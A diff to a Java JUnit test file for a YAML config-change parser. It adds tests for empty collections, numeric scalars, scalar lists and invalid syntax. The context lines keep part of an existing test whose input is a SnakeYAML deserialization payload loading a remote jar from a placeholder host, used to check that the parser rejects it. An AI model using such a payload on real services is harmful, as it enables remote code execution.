@@ -24,6 +24,7 @@ import java.io.IOException;
 import java.util.Map;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
+import static org.junit.jupiter.api.Assertions.assertNotNull;
 import static org.junit.jupiter.api.Assertions.assertNull;
 import static org.junit.jupiter.api.Assertions.assertThrows;
 import static org.junit.jupiter.api.Assertions.assertTrue;
@@ -88,6 +89,40 @@ class YmlChangeParserTest {
                     + "    !!java.net.URL [\"http://[yourhost]:[port]/yaml-payload.jar\"]\n"
                     + "  ]]\n" + "]",
                 type);
+        });
+    }
+    
+    @Test
+    void testEmptyCollectionValue() throws IOException {
+        // collection value empty -> falls into the `result.put(key, "")` branch.
+        Map<String, ConfigChangeItem> map = parser.doParse("", "list: []\n", type);
+        assertNotNull(map.get("list"));
+        assertEquals("", map.get("list").getNewValue());
+    }
+    
+    @Test
+    void testNonStringScalarValue() throws IOException {
+        // numeric scalar -> falls into the `else { result.put(key, e.getValue()) }` branch.
+        Map<String, ConfigChangeItem> map = parser.doParse("", "count: 123\n", type);
+        assertNotNull(map.get("count"));
+        assertEquals("123", map.get("count").getNewValue());
+    }
+    
+    @Test
+    void testCollectionOfScalars() throws IOException {
+        Map<String, ConfigChangeItem> map = parser.doParse("",
+            "items:\n  - 1\n  - 2\n  - 3\n", type);
+        assertNotNull(map.get("items[0]"));
+        assertEquals("1", map.get("items[0]").getNewValue());
+        assertEquals("2", map.get("items[1]").getNewValue());
+        assertEquals("3", map.get("items[2]").getNewValue());
+    }
+    
+    @Test
+    void testInvalidYamlSyntaxRethrown() {
+        // a MarkedYAMLException whose message does NOT match constructor error => rethrown as-is.
+        assertThrows(org.yaml.snakeyaml.error.MarkedYAMLException.class, () -> {
+            parser.doParse("", "a: : :\n", type);
         });
     }
 }
